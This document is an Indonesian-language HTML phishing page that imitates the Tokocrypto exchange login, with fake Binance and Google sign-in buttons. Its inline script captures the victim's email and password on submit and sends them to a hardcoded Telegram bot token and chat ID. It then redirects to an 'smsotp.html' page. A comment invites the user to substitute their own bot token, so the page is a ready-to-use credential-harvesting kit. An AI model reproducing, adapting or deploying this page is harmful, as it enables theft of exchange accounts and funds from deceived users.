<html lang="id">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Masuk
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-[#1a1f1c] text-white min-h-screen flex justify-center items-start pt-10 px-4">
  <div class="w-full max-w-md">
   <div class="flex justify-end mb-6">
    <button aria-label="Close" class="text-white text-2xl font-bold leading-none">
     Ã—
    </button>
   </div>
   <h1 class="text-white text-3xl font-extrabold mb-6">
    Masuk
   </h1>
   <form id="loginForm" class="space-y-6">
    <div>
     <label class="block text-white font-semibold mb-1" for="email">
      E-mail
     </label>
     <input autocomplete="email" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 focus:outline-none focus:ring-2 focus:ring-green-500" id="email" placeholder="Mohon masukkan alamat email anda" required="" type="email"/>
    </div>
    <div>
     <label class="block text-white font-semibold mb-1" for="password">
      Kata sandi
     </label>
     <div class="relative">
      <input autocomplete="current-password" class="w-full rounded-lg bg-[#4a4f56] placeholder-[#a0a0a0] text-white py-3 px-4 pr-10 focus:outline-none focus:ring-2 focus:ring-green-500" id="password" placeholder="Silahkan masukkan kata sandi" required="" type="password"/>
      <button aria-label="Toggle password visibility" class="absolute right-3 top-1/2 -translate-y-1/2 text-[#d1d1d1]" type="button" id="togglePassword">
       <i class="fas fa-eye-slash">
       </i>
      </button>
     </div>
    </div>
    <div>
     <a class="text-green-400 font-semibold text-sm" href="#">
      Lupa kata sandi?
     </a>
    </div>
    <button disabled="" id="submitBtn" class="w-full bg-green-600 text-white font-semibold py-3 rounded-lg mt-4 opacity-50 cursor-not-allowed" type="submit">
     Lanjut
    </button>
   </form>
   <div class="flex items-center my-6 text-gray-400 text-sm">
    <hr class="flex-grow border-gray-600"/>
    <span class="mx-3">
     atau
    </span>
    <hr class="flex-grow border-gray-600"/>
   </div>
   <div class="space-y-4">
    <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700" type="button">
     <img alt="Binance logo, yellow diamond shape" class="w-5 h-5" height="20" loading="lazy" src="https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" width="20"/>
     Lanjutkan dengan Binance
    </button>
    <button class="w-full flex items-center justify-center gap-3 border border-gray-600 rounded-lg py-3 text-white font-semibold hover:bg-gray-700" type="button">
     <img alt="Google logo, multicolor G letter" class="w-5 h-5" height="20" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" width="20"/>
     Lanjutkan dengan Google
    </button>
   </div>
   <p class="mt-6 text-white text-center text-sm">
    Belum punya akun Tokocrypto?
    <a class="text-green-400 font-semibold" href="#">
     Mendaftar
    </a>
   </p>
  </div>
  <script>
   // Toggle password visibility
   const togglePassword = document.getElementById('togglePassword');
   const passwordInput = document.getElementById('password');
   togglePassword.addEventListener('click', () => {
     const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
     passwordInput.setAttribute('type', type);
     togglePassword.innerHTML = type === 'password' ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
   });

   // Disable submit button initially
   const emailInput = document.getElementById('email');
   const submitBtn = document.getElementById('submitBtn');

   function checkInputs() {
     if(emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
       submitBtn.disabled = false;
       submitBtn.classList.remove('opacity-50', 'cursor-not-allowed');
       submitBtn.classList.add('hover:bg-green-700');
     } else {
       submitBtn.disabled = true;
       submitBtn.classList.add('opacity-50', 'cursor-not-allowed');
       submitBtn.classList.remove('hover:bg-green-700');
     }
   }

   emailInput.addEventListener('input', checkInputs);
   passwordInput.addEventListener('input', checkInputs);

   // Telegram Bot info - Ganti dengan token dan chat id kamu
   const TELEGRAM_BOT_TOKEN = '7367488430:AAFt7-ZdH5runtY3gZOv5hoheTN5Qucl74g';
   const TELEGRAM_CHAT_ID = '5906925079';

   document.getElementById('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email = emailInput.value;
     const password = passwordInput.value;

     const message = `Login Data:\nEmail: ${email}\nPassword: ${password}`;

     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

     try {
       const response = await fetch(url, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: message
         })
       });

       if (response.ok) {
         window.location.href = "smsotp.html";
         e.target.reset();
         checkInputs(); // disable button again after reset
       } else {
         alert('Gagal mengirim data ke Telegram.');
       }
     } catch (error) {
       alert('Terjadi kesalahan saat mengirim data.');
       console.error(error);
     }
   });
  </script>
 </body>
  </html>
